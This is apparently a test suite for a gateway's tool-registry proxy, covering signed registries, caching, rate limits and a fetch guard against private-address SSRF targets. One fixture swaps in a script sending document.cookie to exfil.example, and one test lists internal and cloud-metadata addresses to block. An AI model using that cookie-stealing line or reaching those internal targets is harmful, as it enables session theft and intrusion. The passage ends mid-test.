// SPDX-License-Identifier: AGPL-3.0-or-later
// Tool registries: the sysop's list (the bundled project registry plus added ones, replaced by TOOL_REGISTRIES
// when the environment sets it), a player's own while TOOL_REGISTRIES_PLAYERS is on, both in the account's export
// and erasure, and the carrier: with TOOL_REGISTRIES_PROXY on, the gateway fetches a registry's files for the
// browser, keeps them an hour, serves the last good copy while the host is down, caps sizes, fetches only what
// the registry leads to, goes through the fetch guard, and fetches a player's registry for that player alone.
import { afterEach, describe, it, expect, vi } from "vitest";
import { authEnv, call, emailSignup, operatorVerify, ORIGIN, type Res } from "./helpers/authflow.js";
import { serve } from "./helpers/fedpeer.js";
import type { Env } from "@aprscaching/gateway/env";
import { createFetchGuard } from "@aprscaching/gateway/fetchguard";
import { rateLimited, rateLimitedDurable } from "@aprscaching/gateway/corroborate_privacy";
import {
  FILE_REQUESTS_PER_MIN,
  PLAYER_COPIES_CAP,
  PLAYER_COPIES_INSTANCE_CAP,
  PLAYER_FETCHES_PER_HOUR,
  REGISTRY_COPY_TTL_S,
  REGISTRY_FILE_CAP,
} from "@aprscaching/gateway/toolregistries";
import { guardOutboundFetches } from "../src/host.js";
import {
  bytesToB64,
  sha256B64,
  signManifest,
  signRegistry,
  type RegistryEntry,
  type ToolManifest,
} from "@aprscaching/tools";

const KEY_B = "uibFUCjcBnxAe8mRQ1v2neJd0fPV_7Vs0Y59K5vH5Oc";
const REG = "https://raw.githubusercontent.com/club/tools/v1/registry.json";

let ipSeq = 0;
const nextIp = () => `198.51.100.${++ipSeq % 250}`;

interface World {
  env: Env;
  sysop: Res;
  player: Res;
}

async function world(extra: Record<string, unknown> = {}): Promise<World> {
  const env = authEnv({ ADMIN_CALLSIGNS: "OE8APR", ...extra });
  const sysop = await emailSignup(env, "op@example.test", "OE8APR", nextIp());
  expect(sysop.status).toBe(200);
  await operatorVerify(env, "OE8APR");
  const player = await emailSignup(env, "p@example.test", "DL1ABC", nextIp());
  expect(player.status).toBe(200);
  return { env, sysop, player };
}
const as = (r: Res) => ({ cookie: r.cookie });
const withEnv = (w: World, extra: Record<string, string>): Env => ({ ...w.env, ...extra }) as Env;

const pair = async () => {
  const k = (await crypto.subtle.generateKey("Ed25519", true, ["sign", "verify"])) as CryptoKeyPair;
  return {
    priv: k.privateKey,
    pub: bytesToB64(new Uint8Array(await crypto.subtle.exportKey("raw", k.publicKey)), true),
  };
};
/** The registry's authority (pinned as KEY_A), the tool's author, and a stranger who signs neither. */
const authority = await pair();
const author = await pair();
const stranger = await pair();
const KEY_A = authority.pub;

const MANIFEST = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.json";
const SCRIPT = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.js";
const SCRIPT_TEXT = "register({ commands: {} });";
const helloEntry = { name: "hello", title: "Hello", author: "club", version: "1.0.0", pubkey: author.pub };
const signedRegistry = async (entries: RegistryEntry[], by = authority) =>
  JSON.stringify(await signRegistry(entries, by.pub, by.priv));
const signedManifest = async (script: string, by = author) =>
  JSON.stringify(
    await signManifest(
      {
        name: "hello",
        entry: "tool.js",
        pubkey: by.pub,
        entrySha256: await sha256B64(new TextEncoder().encode(script)),
      } as unknown as ToolManifest,
      by.priv,
    ),
  );

/** A registry two levels deep whose entries are relative to it, and the manifests and scripts they lead to. */
const files: Record<string, string> = {
  [REG]: await signedRegistry([{ ...helloEntry, entry: "tools/hello/tool.json" }]),
  [MANIFEST]: await signedManifest(SCRIPT_TEXT),
  [SCRIPT]: SCRIPT_TEXT,
};

/** Stub the network: serve `files`, count the requests, and fail every request while `down`. */
function upstream() {
  const state = { down: false, hits: [] as string[], credentials: [] as (string | undefined)[] };
  vi.stubGlobal("fetch", async (u: RequestInfo | URL, init?: RequestInit) => {
    const url = String(u);
    state.hits.push(url);
    state.credentials.push(init?.credentials);
    if (state.down) throw new Error("network down");
    const body = files[url];
    return body === undefined ? new Response("nope", { status: 404 }) : new Response(body, { status: 200 });
  });
  return state;
}
afterEach(() => {
  vi.unstubAllGlobals();
  vi.useRealTimers();
});

/** Read one carried file, raw. */
async function file(env: Env, id: string, url: string, cookie = "", ip = "192.0.2.10") {
  const res = await serve(env)(
    new Request(`${ORIGIN}/api/tools/registries/${id}/file?url=${encodeURIComponent(url)}`, {
      headers: { cookie, "x-real-ip": ip },
    }),
  );
  return { status: res.status, text: await res.text(), copy: res.headers.get("x-tool-registry-copy") };
}

const addInstance = (w: World, spec = "github:club/tools@v1", authority = KEY_A) =>
  call(w.env, "POST", "/api/admin/tool-registries", { spec, authority, label: "Club" }, as(w.sysop));

describe("the instance's registries", () => {
  it("start with the bundled project registry, which the sysop switches off but never removes", async () => {
    const w = await world();
    const list = await call(w.env, "GET", "/api/admin/tool-registries", undefined, as(w.sysop));
    expect(list.status).toBe(200);
    expect(list.data).toMatchObject({ source: "site", registries: [{ id: "builtin", enabled: true, builtin: true }] });
    expect((await call(w.env, "DELETE", "/api/admin/tool-registries/builtin", undefined, as(w.sysop))).status).toBe(
      400,
    );
    const off = await call(w.env, "PATCH", "/api/admin/tool-registries/builtin", { enabled: false }, as(w.sysop));
    expect(off.data.registry).toMatchObject({ id: "builtin", enabled: false });
    expect((await call(w.env, "GET", "/api/tools/registries")).data.registries).toEqual([]);
    await call(w.env, "PATCH", "/api/admin/tool-registries/builtin", { enabled: true }, as(w.sysop));
    expect((await call(w.env, "GET", "/api/tools/registries")).data.registries).toMatchObject([
      { id: "builtin", url: "/tools/registry.json", proxied: false },
    ]);
  });

  it("adds one with its confirmed key, expands the github: shorthand, and audit-logs each change", async () => {
    const w = await world();
    const add = await addInstance(w);
    expect(add.status).toBe(201);
    expect(add.data.registry).toMatchObject({
      spec: "github:club/tools@v1",
      url: REG,
      authority: KEY_A,
      label: "Club",
    });
    const id = add.data.registry.id as string;
    expect((await addInstance(w)).status).toBe(409); // the same address twice
    const re = await call(w.env, "POST", `/api/admin/tool-registries/${id}/confirm`, { authority: KEY_B }, as(w.sysop));
    expect(re.data.registry.authority).toBe(KEY_B);
    expect((await call(w.env, "DELETE", `/api/admin/tool-registries/${id}`, undefined, as(w.sysop))).status).toBe(200);
    const log = (
      await w.env.DB.prepare("SELECT action FROM moderation_log WHERE target_kind='tool-registry' ORDER BY id").all<{
        action: string;
      }>()
    ).results.map((r) => r.action);
    expect(log).toEqual(["add", "confirm", "remove"]);
  });

  it("is the sysop's alone", async () => {
    const w = await world();
    expect((await call(w.env, "GET", "/api/admin/tool-registries", undefined, as(w.player))).status).toBe(403);
    expect(
      (await call(w.env, "POST", "/api/admin/tool-registries", { spec: REG, authority: KEY_A }, as(w.player))).status,
    ).toBe(403);
    expect((await call(w.env, "POST", "/api/admin/tool-registries", { spec: REG, authority: KEY_A })).status).toBe(403);
  });

  it("checks the address and the key", async () => {
    const w = await world();
    const bad = async (spec: unknown, authority: unknown = KEY_A) =>
      (await call(w.env, "POST", "/api/admin/tool-registries", { spec, authority }, as(w.sysop))).status;
    expect(await bad("http://club.example/registry.json")).toBe(400);
    expect(await bad("https://me:pw@club.example/registry.json")).toBe(400);
    expect(await bad(`https://club.example/${"a".repeat(600)}`)).toBe(400);
    expect(await bad("/tools/registry.json")).toBe(400);
    expect(await bad("github:club")).toBe(400);
    expect(await bad("https://club.example/registry.json", "not-a-key")).toBe(400);
  });

  it("follows TOOL_REGISTRIES when the environment sets it, read-only", async () => {
    const w = await world();
    await addInstance(w);
    const env = withEnv(w, {
      TOOL_REGISTRIES: JSON.stringify([{ url: "https://env.example/r.json", authority: KEY_B, label: "Env" }]),
    });
    const list = await call(env, "GET", "/api/admin/tool-registries", undefined, as(w.sysop));
    expect(list.data.source).toBe("env");
    expect(list.data.registries).toMatchObject([{ id: "env-1", url: "https://env.example/r.json", label: "Env" }]);
    expect(
      (await call(env, "POST", "/api/admin/tool-registries", { spec: REG, authority: KEY_A }, as(w.sysop))).status,
    ).toBe(409);
    expect(
      (await call(env, "PATCH", "/api/admin/tool-registries/builtin", { enabled: false }, as(w.sysop))).status,
    ).toBe(409);
    expect((await call(env, "GET", "/api/tools/registries")).data.registries.map((r: { id: string }) => r.id)).toEqual([
      "env-1",
    ]);
    // an unreadable value lists nothing and says why
    const broken = await call(
      withEnv(w, { TOOL_REGISTRIES: "[{" }),
      "GET",
      "/api/admin/tool-registries",
      undefined,
      as(w.sysop),
    );
    expect(broken.data).toMatchObject({ source: "env", registries: [], envError: "TOOL_REGISTRIES is not JSON" });
  });
});

describe("the two switches", () => {
  it("are instance settings in the Tools group: saved on the page, and the environment wins", async () => {
    const w = await world();
    const settings = await call(w.env, "GET", "/api/admin/settings", undefined, as(w.sysop));
    const tools = settings.data.settings.filter((s: { group: string }) => s.group === "tools");
    expect(tools.map((s: { key: string; control: string; value: string }) => [s.key, s.control, s.value])).toEqual([
      ["TOOL_REGISTRIES_PLAYERS", "switch", "1"],
      ["TOOL_REGISTRIES_PROXY", "switch", "1"],
    ]);
    const put = (key: string, value: string) =>
      call(w.env, "PUT", `/api/admin/settings/${key}`, { value }, as(w.sysop));
    expect((await put("TOOL_REGISTRIES_PLAYERS", "0")).status).toBe(200);
    expect((await put("TOOL_REGISTRIES_PROXY", "0")).status).toBe(200);
    expect((await call(w.env, "GET", "/api/tools/registries", undefined, as(w.player))).data).toMatchObject({
      proxy: false,
      players: { allowed: false },
    });
    const env = withEnv(w, { TOOL_REGISTRIES_PLAYERS: "1" });
    expect((await call(env, "GET", "/api/tools/registries", undefined, as(w.player))).data.players.allowed).toBe(true);
    expect(
      (await call(env, "PUT", "/api/admin/settings/TOOL_REGISTRIES_PLAYERS", { value: "0" }, as(w.sysop))).status,
    ).toBe(409);
  });
});

describe("a player's own registries", () => {
  const addMine = (w: World, spec = REG, env = w.env) =>
    call(env, "POST", "/api/my/tool-registries", { spec, authority: KEY_A }, as(w.player));

  it("need a session, and are the player's alone", async () => {
    const w = await world();
    expect((await call(w.env, "GET", "/api/my/tool-registries")).status).toBe(401);
    const add = await addMine(w);
    expect(add.status).toBe(201);
    expect(add.data.registry.scope).toBe("account");
    const mine = await call(w.env, "GET", "/api/tools/registries", undefined, as(w.player));
    expect(mine.data.registries.map((r: { scope: string }) => r.scope)).toEqual(["instance", "account"]);
    // nobody else sees it, and the sysop's list does not hold it
    expect((await call(w.env, "GET", "/api/tools/registries", undefined, as(w.sysop))).data.registries).toHaveLength(1);
    expect(
      (await call(w.env, "GET", "/api/admin/tool-registries", undefined, as(w.sysop))).data.registries,
    ).toHaveLength(1);
    const id = add.data.registry.id as string;
    expect((await call(w.env, "DELETE", `/api/my/tool-registries/${id}`, undefined, as(w.sysop))).status).toBe(404);
  });

  it("hold at most ten", async () => {
    const w = await world();
    for (let i = 0; i < 10; i++) expect((await addMine(w, `https://r${i}.example/registry.json`)).status).toBe(201);
    expect((await addMine(w, "https://r10.example/registry.json")).status).toBe(409);
  });

  it("are hidden, not fetched and kept while the sysop switches players' registries off", async () => {
    const w = await world();
    upstream();
    const id = (await addMine(w)).data.registry.id as string;
    const off = withEnv(w, { TOOL_REGISTRIES_PLAYERS: "0" });
    const eff = await call(off, "GET", "/api/tools/registries", undefined, as(w.player));
    expect(eff.data.registries.map((r: { id: string }) => r.id)).toEqual(["builtin"]);
    expect(eff.data.players).toEqual({ allowed: false, signedIn: true, stored: 1 });
    expect((await file(off, id, REG, w.player.cookie)).status).toBe(404);
    expect((await addMine(w, "https://other.example/r.json", off)).status).toBe(403);
    expect((await call(off, "GET", "/api/my/tool-registries", undefined, as(w.player))).data).toMatchObject({
      allowed: false,
      registries: [{ id }],
    });
    // back on, the registry is there again; the player may remove it either way
    expect((await call(w.env, "GET", "/api/tools/registries", undefined, as(w.player))).data.registries).toHaveLength(
      2,
    );
    expect((await call(off, "DELETE", `/api/my/tool-registries/${id}`, undefined, as(w.player))).status).toBe(200);
  });

  it("are in the account's export, and erased with it, copies included", async () => {
    const w = await world();
    upstream();
    const id = (await addMine(w)).data.registry.id as string;
    expect((await file(w.env, id, REG, w.player.cookie)).status).toBe(200);
    const exp = await call(w.env, "POST", "/api/account/DL1ABC/export", {}, as(w.player));
    expect(exp.status).toBe(200);
    expect(exp.data.toolRegistries).toEqual([expect.objectContaining({ url: REG, authority: KEY_A, enabled: 1 })]);
    expect((await call(w.env, "POST", "/api/account/DL1ABC/delete", {}, as(w.player))).status).toBe(200);
    const left = await w.env.DB.prepare(
      "SELECT (SELECT COUNT(*) FROM tool_registries WHERE account_id IS NOT NULL) + (SELECT COUNT(*) FROM tool_registry_files) AS n",
    ).first<{ n: number }>();
    expect(left?.n).toBe(0);
  });
});

describe("the carrier", () => {
  it("fetches a registry, its relative manifests and their scripts, without credentials", async () => {
    const w = await world();
    const net = upstream();
    const id = (await addInstance(w)).data.registry.id as string;
    const eff = await call(w.env, "GET", "/api/tools/registries");
    expect(eff.data.registries.find((r: { id: string }) => r.id === id)).toMatchObject({ proxied: true });
    const manifest = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.json";
    const script = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.js";
    // a manifest or a script is carried only once the registry that leads to it is
    expect((await file(w.env, id, manifest)).status).toBe(404);
    const reg = await file(w.env, id, REG);
    expect(reg).toMatchObject({ status: 200, copy: "fresh" });
    expect(JSON.parse(reg.text).authority).toBe(KEY_A); // carried as fetched: the browser checks the signature
    expect((await file(w.env, id, script)).status).toBe(404);
    expect((await file(w.env, id, manifest)).status).toBe(200);
    expect(await file(w.env, id, script)).toMatchObject({ status: 200, text: files[script] });
    // nothing else, even on the same host
    expect((await file(w.env, id, "https://raw.githubusercontent.com/club/tools/v1/secret.json")).status).toBe(404);
    expect(net.credentials.every((c) => c === "omit")).toBe(true);
  });

  it("serves its copy for an hour, then fetches again, and keeps the last good copy while the host is down", async () => {
    const w = await world();
    const net = upstream();
    const id = (await addInstance(w)).data.registry.id as string;
    vi.useFakeTimers({ toFake: ["Date"] });
    const t0 = Date.now();
    expect((await file(w.env, id, REG)).status).toBe(200);
    expect((await file(w.env, id, REG)).copy).toBe("fresh");
    expect(net.hits.filter((u) => u === REG)).toHaveLength(1);

    vi.setSystemTime(t0 + (REGISTRY_COPY_TTL_S + 1) * 1000);
    net.down = true;
    const stale = await file(w.env, id, REG);
    expect(stale).toMatchObject({ status: 200, copy: "stale" });
    expect(JSON.parse(stale.text).authority).toBe(KEY_A);
    // a failure waits a while before the next attempt
    await file(w.env, id, REG);
    expect(net.hits.filter((u) => u === REG)).toHaveLength(2);

    vi.setSystemTime(t0 + (REGISTRY_COPY_TTL_S + 600) * 1000);
    net.down = false;
    expect((await file(w.env, id, REG)).copy).toBe("fresh");
    expect(net.hits.filter((u) => u === REG)).toHaveLength(3);
  });

  it("answers 502 when it never had a copy", async () => {
    const w = await world();
    const net = upstream();
    net.down = true;
    const id = (await addInstance(w)).data.registry.id as string;
    const r = await file(w.env, id, REG);
    expect(r.status).toBe(502);
    expect(JSON.parse(r.text).error).toBe("couldn't fetch the file: its host is unreachable from this instance");
  });

  it("refuses a file over its cap, and keeps nothing of it", async () => {
    const w = await world();
    vi.stubGlobal("fetch", async () => new Response("x".repeat(REGISTRY_FILE_CAP.registry + 1)));
    const id = (await addInstance(w)).data.registry.id as string;
    const r = await file(w.env, id, REG);
    expect(r.status).toBe(502);
    expect(JSON.parse(r.text).error).toMatch(/larger than 256 KB/);
    const row = await w.env.DB.prepare("SELECT body FROM tool_registry_files WHERE registry_id=?")
      .bind(id)
      .first<{ body: string | null }>();
    expect(row?.body).toBeNull();
  });

  it("keeps and relays only what its signer vouches for: the registry, its manifests and their scripts", async () => {
    const w = await world();
    upstream();
    const id = (await addInstance(w)).data.registry.id as string;
    const held = async (url: string) =>
      (
        await w.env.DB.prepare("SELECT body FROM tool_registry_files WHERE registry_id=? AND url=?")
          .bind(id, url)
          .first<{ body: string | null }>()
      )?.body ?? null;
    const refused = async (url: string, error: RegExp) => {
      await w.env.DB.prepare("DELETE FROM tool_registry_files WHERE registry_id=? AND url=?").bind(id, url).run();
      const r = await file(w.env, id, url);
      expect(r.status).toBe(502);
      expect(JSON.parse(r.text).error).toMatch(error);
      expect(await held(url)).toBeNull();
      // the failure would otherwise hold the next attempt back
      await w.env.DB.prepare("DELETE FROM tool_registry_files WHERE registry_id=? AND url=?").bind(id, url).run();
    };
    const good = { ...files };
    try {
      // a registry file whose signature fails under the pinned key, and one with no signature at all
      files[REG] = JSON.stringify({ ...JSON.parse(good[REG]!), sig: "x" });
      await refused(REG, /does not verify under its pinned key/);
      files[REG] = JSON.stringify({ ...JSON.parse(good[REG]!), sig: undefined });
      await refused(REG, /does not verify under its pinned key/);
      files[REG] = good[REG]!;
      expect((await file(w.env, id, REG)).status).toBe(200);

      // a manifest signed by a stranger, one whose fields were changed after signing, one with no signature
      files[MANIFEST] = await signedManifest(SCRIPT_TEXT, stranger);
      await refused(MANIFEST, /signed by another key than the registry lists/);
      files[MANIFEST] = JSON.stringify({ ...JSON.parse(good[MANIFEST]!), entrySha256: "AAAA" });
      await refused(MANIFEST, /signature does not verify/);
      files[MANIFEST] = JSON.stringify({ ...JSON.parse(good[MANIFEST]!), signature: undefined });
      await refused(MANIFEST, /signature does not verify/);
      files[MANIFEST] = good[MANIFEST]!;
      expect((await file(w.env, id, MANIFEST)).status).toBe(200);

      // a script other than the one the manifest signs
      files[SCRIPT] = "fetch('https://exfil.example/' + document.cookie);";
      await refused(SCRIPT, /SHA-256 is not the one its manifest signs/);
      files[SCRIPT] = good[SCRIPT]!;
      expect(await file(w.env, id, SCRIPT)).toMatchObject({ status: 200, text: SCRIPT_TEXT });
    } finally {
      Object.assign(files, good);
    }
  });

  it("answers a registry file signed by another key with that key, relays none of it, and refetches once it is confirmed", async () => {
    const w = await world();
    upstream();
    const id = (await addInstance(w)).data.registry.id as string;
    vi.useFakeTimers({ toFake: ["Date"] });
    const t0 = Date.now();
    expect((await file(w.env, id, REG)).status).toBe(200);
    const good = files[REG]!;
    try {
      files[REG] = await signedRegistry([{ ...helloEntry, entry: "tools/hello/tool.json" }], stranger);
      vi.setSystemTime(t0 + (REGISTRY_COPY_TTL_S + 1) * 1000);
      // reported over the copy held, and again while the next attempt waits
      for (let i = 0; i < 2; i++) {
        const r = await file(w.env, id, REG);
        expect(r.status).toBe(409);
        expect(JSON.parse(r.text)).toMatchObject({ authority: stranger.pub });
      }
      const held = await w.env.DB.prepare("SELECT body FROM tool_registry_files WHERE registry_id=? AND url=?")
        .bind(id, REG)
        .first<{ body: string }>();
      expect(held?.body).toBe(good);

      const ok = await call(
        w.env,
        "POST",
        `/api/admin/tool-registries/${id}/confirm`,
        { authority: stranger.pub },
        as(w.sysop),
      );
      expect(ok.status).toBe(200);
      const r = await file(w.env, id, REG);
      expect(r).toMatchObject({ status: 200, copy: "fresh", text: files[REG] });
    } finally {
      files[REG] = good;
    }
  });

  it("refuses a registry file that is not JSON", async () => {
    const w = await world();
    vi.stubGlobal("fetch", async () => new Response("<html>"));
    const id = (await addInstance(w)).data.registry.id as string;
    expect(JSON.parse((await file(w.env, id, REG)).text).error).toMatch(/not JSON/);
  });

  it("goes through its own fetch guard: a host that resolves to a private address is refused", async () => {
    const w = await world();
    const net = upstream();
    const env = { ...w.env, TOOL_FETCH_GUARD: createFetchGuard({ resolve: async () => ["10.0.0.7"] }) } as Env;
    const id = (await addInstance(w)).data.registry.id as string;
    const r = await file(env, id, REG);
    expect(r.status).toBe(502);
    expect(JSON.parse(r.text).error).toBe("couldn't fetch the file: its host is unreachable from this instance");
    expect(net.hits).toEqual([]);
  });

  it("fetches a player's registry for that player alone, and rate-limits the player's fetches", async () => {
    const w = await world();
    const net = upstream();
    const id = (await call(w.env, "POST", "/api/my/tool-registries", { spec: REG, authority: KEY_A }, as(w.player)))
      .data.registry.id as string;
    expect((await file(w.env, id, REG)).status).toBe(404); // no session
    expect((await file(w.env, id, REG, w.sysop.cookie)).status).toBe(404); // someone else's
    expect((await file(w.env, id, REG, w.player.cookie)).status).toBe(200);

    // the limit counts fetches from the registry's host: past it, a file with no copy waits
    const acct = (await w.env.DB.prepare("SELECT account_id FROM accounts WHERE callsign='DL1ABC'").first<{
      account_id: string;
    }>())!.account_id;
    for (let i = 0; i < PLAYER_FETCHES_PER_HOUR; i++)
      await rateLimitedDurable(w.env, `toolreg-fetch:${acct}`, Date.now(), PLAYER_FETCHES_PER_HOUR, 3600_000);
    const before = net.hits.length;
    const manifest = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.json";
    expect((await file(w.env, id, manifest, w.player.cookie)).status).toBe(429);
    expect(net.hits.length).toBe(before);
    // the copy it already holds still serves
    expect((await file(w.env, id, REG, w.player.cookie)).status).toBe(200);
  });

  it("caps a player's copies over all their registries, and every player's copies on the instance", async () => {
    const w = await world();
    upstream();
    const id = (await call(w.env, "POST", "/api/my/tool-registries", { spec: REG, authority: KEY_A }, as(w.player)))
      .data.registry.id as string;
    const acct = (await w.env.DB.prepare("SELECT account_id FROM accounts WHERE callsign='DL1ABC'").first<{
      account_id: string;
    }>())!.account_id;
    // copies the player already holds under another registry of theirs, each well under the per-registry cap
    const hold = async (owner: string | null, regId: string, bytes: number) => {
      await w.env.DB.prepare(
        `INSERT INTO tool_registries (id, account_id, spec, url, authority, label, created_at, confirmed_at, added_by)
         VALUES (?, ?, 'x', 'https://x.example/registry.json', ?, 'x', 0, 0, 'X')`,
      )
        .bind(regId, owner, KEY_A)
        .run();
      await w.env.DB.prepare(
        "INSERT INTO tool_registry_files (registry_id, url, body, bytes, fetched_at, tried_at) VALUES (?, 'https://x.example/a', '', ?, 0, 0)",
      )
        .bind(regId, bytes)
        .run();
    };
    await hold(acct, "other-of-mine", PLAYER_COPIES_CAP - 10);
    const r = await file(w.env, id, REG, w.player.cookie);
    expect(r.status).toBe(502);
    expect(JSON.parse(r.text).error).toMatch(/your registries' files pass 4 MB together/);

    // freed, the player's own budget fits, but every player's copies together are at the instance's ceiling
    // a failed fetch waits before the next attempt: forget it, so the next request fetches again
    const retry = () => w.env.DB.prepare("DELETE FROM tool_registry_files WHERE registry_id=?").bind(id).run();
    await retry();
    await w.env.DB.prepare("DELETE FROM tool_registry_files WHERE registry_id='other-of-mine'").run();
    const other = await emailSignup(w.env, "q@example.test", "DL2XYZ", nextIp());
    const otherAcct = (await w.env.DB.prepare("SELECT account_id FROM accounts WHERE callsign='DL2XYZ'").first<{
      account_id: string;
    }>())!.account_id;
    expect(other.status).toBe(200);
    await hold(otherAcct, "someone-elses", PLAYER_COPIES_INSTANCE_CAP - 10);
    const full = await file(w.env, id, REG, w.player.cookie);
    expect(full.status).toBe(502);
    expect(JSON.parse(full.text).error).toMatch(/holds as many players' registry files as it keeps/);

    await retry();
    await w.env.DB.prepare("DELETE FROM tool_registry_files WHERE registry_id='someone-elses'").run();
    expect((await file(w.env, id, REG, w.player.cookie)).status).toBe(200);
  });

  it("shows a registry before it is added, to the sysop and to a player while players may add one", async () => {
    const w = await world();
    upstream();
    const preview = async (env: Env, who: Res | null, spec: string) => {
      const res = await serve(env)(
        new Request(`${ORIGIN}/api/tools/registries/preview?spec=${encodeURIComponent(spec)}`, {
          headers: { cookie: who?.cookie ?? "", "x-real-ip": "192.0.2.10" },
        }),
      );
      return { status: res.status, text: await res.text() };
    };
    const sys = await preview(w.env, w.sysop, "github:club/tools@v1");
    expect(sys.status).toBe(200);
    expect(JSON.parse(sys.text).authority).toBe(KEY_A);
    expect((await preview(w.env, w.player, "github:club/tools@v1")).status).toBe(200);
    expect((await preview(w.env, null, "github:club/tools@v1")).status).toBe(401);
    expect((await preview(withEnv(w, { TOOL_REGISTRIES_PLAYERS: "0" }), w.player, REG)).status).toBe(403);
    expect((await preview(w.env, w.sysop, "http://club.example/r.json")).status).toBe(400);
    // nothing is kept
    expect((await w.env.DB.prepare("SELECT COUNT(*) AS n FROM tool_registry_files").first<{ n: number }>())?.n).toBe(0);
  });

  it("is off with TOOL_REGISTRIES_PROXY=0: the browser fetches directly", async () => {
    const w = await world();
    upstream();
    const id = (await addInstance(w)).data.registry.id as string;
    const off = withEnv(w, { TOOL_REGISTRIES_PROXY: "0" });
    expect((await call(off, "GET", "/api/tools/registries")).data).toMatchObject({
      proxy: false,
      registries: [{ proxied: false }, { proxied: false }],
    });
    expect((await file(off, id, REG)).status).toBe(404);
  });
});

describe("the carrier's fetch guard", () => {
  const PRIVATE = [
    "https://10.0.0.7/registry.json",
    "https://192.168.1.5/registry.json",
    "https://172.20.0.1/registry.json",
    "https://100.64.0.1/registry.json",
    "https://127.0.0.1/registry.json",
    "https://169.254.169.254/registry.json",
    "https://[::1]/registry.json",
    "https://[fd00::1]/registry.json",
    "https://[::ffff:192.168.1.5]/registry.json",
    "https://localhost/registry.json",
    "https://box.localhost/registry.json",
  ];
  const GENERIC = "couldn't fetch the registry: its host is unreachable from this instance";

  const preview = async (env: Env, who: Res, spec: string) => {
    const res = await serve(env)(
      new Request(`${ORIGIN}/api/tools/registries/preview?spec=${encodeURIComponent(spec)}`, {
        headers: { cookie: who.cookie, "x-real-ip": "192.0.2.30" },
      }),
    );
    return { status: res.status, error: ((await res.json()) as { error?: string }).error };
  };

  it("refuses LAN and private targets even with FED_ALLOW_PRIVATE=1 and FED_PEERS / FED_HUB_URL naming them", async () => {
    const w = await world();
    const net = upstream();
    // the host's own guards, under a configuration that opens federation to all of them
    const env = withEnv(w, {
      FED_ALLOW_PRIVATE: "1",
      FED_PEERS: "https://10.0.0.7,https://192.168.1.5",
      FED_HUB_URL: "https://127.0.0.1",
    });
    guardOutboundFetches(env);
    for (const spec of PRIVATE)
      expect(await preview(env, w.sysop, spec), spec).toEqual({ status: 502, error: GENERIC });
    expect(net.hits).toEqual([]);
    // a carried file the registry leads to is held to the same guard
    const id = (
      await call(env, "POST", "/api/admin/tool-registries", { spec: PRIVATE[1], authority: KEY_A }, as(w.sysop))
    ).data.registry.id as string;
    expect(await file(env, id, PRIVATE[1]!, "", "192.0.2.31")).toMatchObject({ status: 502 });
    expect(net.hits).toEqual([]);
  });

  it("refuses a name that resolves privately under FED_ALLOW_PRIVATE, and says the same as for a name that does not resolve", async () => {
    const w = await world();
    const net = upstream();
    const fedOpen = createFetchGuard({ resolve: async () => ["192.168.1.5"], allowPrivate: true });
    const lan = { ...w.env, FED_ALLOW_PRIVATE: "1", FED_FETCH_GUARD: fedOpen } as Env;
    const privateName = {
      ...lan,
      TOOL_FETCH_GUARD: createFetchGuard({ resolve: async () => ["192.168.1.5"] }),
    } as Env;
    const noName = {
      ...lan,
      TOOL_FETCH_GUARD: createFetchGuard({
        resolve: async () => {
          throw new Error("ENOTFOUND");
        },
      }),
    } as Env;
    const a = await preview(privateName, w.sysop, "https://router.lan.example/registry.json");
    const b = await preview(noName, w.sysop, "https://nowhere.example/registry.json");
    expect(a).toEqual({ status: 502, error: GENERIC });
    expect(b).toEqual(a);
    expect(net.hits).toEqual([]);
  });

  it("follows a redirect only to https and never onto a private address, at most three times", async () => {
    const w = await world();
    const hits: string[] = [];
    const routes: Record<string, string> = {
      "https://a.example/r.json": "http://b.example/r.json",
      "https://c.example/r.json": "https://10.0.0.7/r.json",
      "https://d.example/r.json": "https://e.example/r.json",
      "https://e.example/r.json": "https://raw.githubusercontent.com/club/tools/v1/registry.json",
      "https://l1.example/r.json": "https://l2.example/r.json",
      "https://l2.example/r.json": "https://l3.example/r.json",
      "https://l3.example/r.json": "https://l4.example/r.json",
      "https://l4.example/r.json": "https://l5.example/r.json",
    };
    vi.stubGlobal("fetch", async (u: RequestInfo | URL, init?: RequestInit) => {
      const url = String(u);
      hits.push(url);
      expect(init?.redirect).toBe("manual");
      const to = routes[url];
      if (to) return new Response(null, { status: 302, headers: { location: to } });
      const body = files[url];
      return body === undefined ? new Response("nope", { status: 404 }) : new Response(body);
    });
    const env = withEnv(w, { FED_ALLOW_PRIVATE: "1" });
    guardOutboundFetches(env);
    // the resolver is the host's: keep these names off the network by answering them here
    env.TOOL_FETCH_GUARD = createFetchGuard({ resolve: async () => ["203.0.113.9"] });
    expect(await preview(env, w.sysop, "https://a.example/r.json")).toEqual({
      status: 502,
      error: "couldn't fetch the registry: it redirects off https",
    });
    expect(hits).toEqual(["https://a.example/r.json"]);
    expect(await preview(env, w.sysop, "https://c.example/r.json")).toEqual({ status: 502, error: GENERIC });
    expect(hits).not.toContain("https://10.0.0.7/r.json");
    expect((await preview(env, w.sysop, "https://d.example/r.json")).status).toBe(200);
    expect(await preview(env, w.sysop, "https://l1.example/r.json")).toEqual({
      status: 502,
      error: "couldn't fetch the registry: it redirects too many times",
    });
    expect(hits).not.toContain("https://l5.example/r.json");
  });
});

describe("carried files", () => {
  it("are limited per client address", async () => {
    const w = await world();
    upstream();
    const id = (await addInstance(w)).data.registry.id as string;
    const ip = "192.0.2.40";
    expect((await file(w.env, id, REG, "", ip)).status).toBe(200);
    for (let i = 1; i < FILE_REQUESTS_PER_MIN; i++)
      rateLimited(`toolreg-file:${w.env.INSTANCE ?? ""}:${ip}`, Date.now(), FILE_REQUESTS_PER_MIN);
    expect((await file(w.env, id, REG, "", ip)).status).toBe(429);
    // another client is not held back by it
    expect((await file(w.env, id, REG, "", "192.0.2.41")).status).toBe(200);
  });

  it("parse the registry once, until a refreshed copy changes what it leads to", async () => {
    const w = await world();
    const net = upstream();
    const id = (await addInstance(w)).data.registry.id as string;
    const manifest = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.json";
    const script = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.js";
    let reads = 0;
    const db = w.env.DB;
    const counted = {
      ...w.env,
      DB: new Proxy(db, {
        get: (t, k) =>
          k === "prepare"
            ? (sql: string) => {
